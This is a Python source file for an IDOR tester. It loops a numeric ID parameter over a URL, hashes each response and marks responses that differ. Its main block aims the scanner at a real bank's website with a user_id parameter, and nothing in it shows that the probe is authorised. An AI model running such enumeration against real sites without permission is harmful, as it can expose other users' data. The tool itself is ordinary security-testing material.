# xss_security_gui/idor_tester.py
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import time
import hashlib

def fuzz_id_parameter(
    url,
    param="id",
    start=1,
    stop=10,
    method="GET",
    headers=None,
    delay=0.5,
    timeout=5,
    auth_token=None
):
    results = []
    base_resp = None
    base_hash = None

    if not url or not param:
        raise ValueError("URL и параметр должны быть указаны")

    if start > stop:
        start, stop = stop, start

    if headers is None:
        headers = {
            "User-Agent": "IDOR-Fuzzer/1.0"
        }

    if auth_token:
        headers["Authorization"] = f"Bearer {auth_token}"

    for i in range(start, stop + 1):
        parsed = urlparse(url)
        query = parse_qs(parsed.query)
        query[param] = [str(i)]
        new_query = urlencode(query, doseq=True)
        new_url = urlunparse((
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            new_query,
            parsed.fragment
        ))

        try:
            if method.upper() == "GET":
                r = requests.get(new_url, headers=headers, timeout=timeout)
            elif method.upper() == "POST":
                r = requests.post(parsed.scheme + "://" + parsed.netloc + parsed.path,
                                  headers=headers,
                                  data={param: str(i)},
                                  timeout=timeout)
            else:
                raise ValueError(f"Unsupported method: {method}")

            text = r.text.strip()
            hash_val = hashlib.md5(text.encode()).hexdigest()

            if i == start:
                base_resp = text
                base_hash = hash_val

            differs = (text != base_resp or hash_val != base_hash or len(text) != len(base_resp))
            results.append({
                "url": new_url if method.upper() == "GET" else f"{parsed.scheme}://{parsed.netloc}{parsed.path}",
                "status": r.status_code,
                "length": len(text),
                "hash": hash_val,
                "differs": differs
            })

            time.sleep(delay)

        except Exception as e:
            results.append({
                "url": new_url,
                "status": "ERR",
                "length": 0,
                "hash": None,
                "differs": False,
                "error": str(e)
            })

    return results

if __name__ == "__main__":
    base_url = "https://gazprombank.ru/"
    param = "user_id"
    res = fuzz_id_parameter(
        base_url,
        param=param,
        start=1,
        stop=5,
        method="GET",
        headers={"User-Agent": "Bamboo-IDOR-Scanner"},
        auth_token=None
    )

    for r in sorted(res, key=lambda x: x["status"]):
        mark = "✅" if r["differs"] else "⚠️"
        print(f"{mark} {r['url']} | status={r['status']} | len={r['length']} | hash={r['hash']}")
        if "error" in r:
            print(f"   ❌ Error: {r['error']}")